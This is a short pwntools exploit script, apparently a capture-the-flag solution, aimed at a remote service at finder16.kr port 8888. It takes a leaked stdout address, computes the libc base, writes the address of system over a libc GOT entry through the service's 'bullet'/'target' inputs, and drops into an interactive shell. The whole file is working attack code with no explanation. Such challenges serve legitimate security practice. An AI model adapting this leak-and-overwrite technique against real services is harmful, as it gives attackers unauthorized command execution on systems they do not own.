from pwn import *

p = remote("finder16.kr", 8888)
e = ELF("./prob")
libc = e.libc
context.terminal = ['tmux', 'split', '-h']
context.log_level = 'debug'


p.recvuntil(b"addr : ")
lb = int(p.recvline()[:-1], 16) - libc.sym["_IO_2_1_stdout_"]
libc_got = lb + 0x21a098
system = lb + libc.sym["system"]
p.recvuntil(b"bullet\r\n")
p.sendline(hex(system)[2:])
p.recvuntil(b"target\r\n")
p.sendline(hex(libc_got))

p.interactive()